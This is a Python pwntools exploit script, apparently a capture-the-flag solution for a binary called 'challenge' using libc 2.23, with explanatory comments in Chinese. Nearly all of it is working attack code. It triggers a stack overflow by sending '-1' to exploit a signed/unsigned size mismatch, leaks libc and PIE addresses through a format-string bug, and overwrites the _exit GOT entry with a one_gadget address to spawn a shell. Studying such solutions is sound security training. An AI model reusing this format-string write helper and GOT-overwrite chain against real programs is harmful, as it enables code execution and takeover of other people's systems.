# libc2.23
# encoding: utf-8

from pwn import *

context.arch = 'amd64'
elf = ELF('./challenge')
libc = ELF('./libc-2.23.so')

def fmt(prev, value, idx, byte=1):
	ln  = "%{}c%{}$ln"
	n   = "%{}c%{}$n"
	hn  = "%{}c%{}$hn"
	hhn = "%{}c%{}$hhn"

	op = {1:hhn, 2:hn, 4:n, 8:ln}
	offset = {1: 0x100, 2: 0x10000, 4:0x100000000, 8:0x10000000000000000}
	if value > prev:
		return op[byte].format(value-prev, idx)
	elif value == prev:
		if byte==1:
			return "%{}$hhn".format(idx)
		elif byte == 2:
			return "%{}$hn".format(idx)
		elif byte == 4:
			return "%{}$n".format(idx)
		elif byte == 8:
			return "%{}$ln".format(idx)
	else:
		return op[byte].format(value-prev+offset[byte], idx)

r = process('./challenge')

# alloca 用   signed 作為參數
# read   用 unsigned 作為參數
# 輸入 -1 會 alloca 一段很小的空間, 但可以讀入很長的字串導致 overflow
r.sendline('-1')

# 由於 return 時發現 [rsp+0x18] 為 main 的位址
# 所以跳到 __libc_start_main<+233>   mov    rax,QWORD PTR [rsp+0x18]
# 並透過下行 call rax 回到 main
# %27$lx 用來 leak
r.send("%27$lx"+'a'*0x82+'\x29')

recv = r.recvuntil('\x7f')
libc_base = u64(recv[-6:]+'\x00'*2) - 0x20829
pie_base = int(recv[:12],16) - 0x880

one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_shot = libc_base + one_gadget[3]

print "libc_base @ ", hex(libc_base)
print "pie_base @ ", hex(pie_base)
print "one_shot @ ", hex(one_shot)


exit_got = pie_base + elf.symbols['got._exit']

# 將 exit_got 寫入 one_shot
payload = ''
payload += fmt(0, one_shot&0xffff, 12, 2)
payload += fmt(one_shot&0xffff, (one_shot>>16)&0xffff, 13, 2)
payload += fmt((one_shot>>16)&0xffff, (one_shot>>32)&0xffff, 14, 2)
payload = payload.ljust(0x30, 'a')
payload += p64(exit_got)
payload += p64(exit_got+2)
payload += p64(exit_got+4)

r.send(payload)
r.interactive()
